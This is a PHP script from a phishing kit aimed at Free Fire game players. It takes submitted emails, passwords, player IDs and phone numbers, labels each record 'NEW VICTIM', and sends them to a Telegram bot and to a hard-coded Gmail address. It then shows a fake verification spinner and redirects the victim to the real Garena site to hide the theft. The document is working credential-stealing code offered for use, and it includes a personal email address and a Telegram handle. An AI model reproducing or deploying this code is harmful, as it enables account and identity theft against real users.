<?php
// Error reporting band kar — production ke liye
error_reporting(0);
ini_set('display_errors', 0);

include 'bot.php';

// POST data safely le
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$playid = isset($_POST['playid']) ? $_POST['playid'] : '';
$phone = isset($_POST['phone']) ? $_POST['phone'] : '';
$level = isset($_POST['level']) ? $_POST['level'] : '';
$login = isset($_POST['login']) ? $_POST['login'] : '';

// Agar koi bhi field empty hai to redirect
if(empty($email) && empty($password)) {
    header("Location: index.php");
    exit();
}

// Telegram message banao
$message = "<b>🔥 NEW VICTIM 🔥</b>\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "📧 Email: " . $email . "\n";
$message .= "🔑 Password: " . $password . "\n";
$message .= "🎮 Character ID: " . $playid . "\n";
$message .= "📱 Phone: " . $phone . "\n";
$message .= "⭐ Level: " . $level . "\n";
$message .= "🌐 Login Type: " . $login . "\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🕒 Time: " . date('d-m-Y H:i:s') . "\n";
$message .= "@venomx_here";

// Telegram pe bhejo
sendTelegram($token, $chat_id, $message);

// Email pe bhejo (optional)
$to = "devender56227@gmail.com";
$subject = "New FreeFire Login - " . $email;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$body = "<h2>FreeFire Account Details</h2>
         <p><b>Email:</b> $email</p>
         <p><b>Password:</b> $password</p>
         <p><b>Character ID:</b> $playid</p>
         <p><b>Phone:</b> $phone</p>
         <p><b>Level:</b> $level</p>
         <p><b>Login Type:</b> $login</p>";
@mail($to, $subject, $body, $headers);

// User ko success page dikhao
?>
<!DOCTYPE html>
<html>
<head>
    <title>Processing...</title>
    <style>
        body { background: #000; color: #ffcc00; font-family: Arial; text-align: center; padding: 100px; }
        .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #ffcc00; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <h2>Verifying Account...</h2>
    <p>Please wait, this may take a moment.</p>
    <p style="color: #666; font-size: 12px;">You will be redirected automatically.</p>
    
    <script>
        setTimeout(function() {
            window.location.href = "https://ff.garena.com/en/";
        }, 3000);
    </script>
</body>
</html>
